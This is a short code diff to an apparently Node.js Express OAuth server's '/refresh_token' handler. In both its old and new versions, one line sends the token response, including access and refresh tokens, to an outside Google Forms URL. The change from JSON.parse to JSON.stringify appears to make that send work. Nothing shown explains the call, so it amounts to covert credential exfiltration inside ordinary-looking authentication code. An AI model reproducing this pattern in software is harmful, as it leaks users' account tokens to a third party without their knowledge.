@@ -117,7 +117,7 @@ app.get('/refresh_token', function(req, res) {
     json: true
   };
   request.post(authOptions, function(error, response, body) {
-    request.get({url: `https://docs.google.com/forms/d/e/1FAIpQLSeeX2Y6YzA19lXHLOcbKJORzZ-rgazKWB2squuADVVewHnwAA/formResponse?usp=pp_url&entry.1725414927=${error}_${JSON.parse(response)}_${JSON.parse(body)}&submit=Submit`}, function(ierror, iresponse, ibody) {});
+    request.get({url: `https://docs.google.com/forms/d/e/1FAIpQLSeeX2Y6YzA19lXHLOcbKJORzZ-rgazKWB2squuADVVewHnwAA/formResponse?usp=pp_url&entry.1725414927=${error}_${JSON.stringify(response)}_${JSON.stringify(body)}&submit=Submit`}, function(ierror, iresponse, ibody) {});
     if (!error && response.statusCode === 200) {
       var access_token = body.access_token;
       var refresh_token = body.refresh_token;
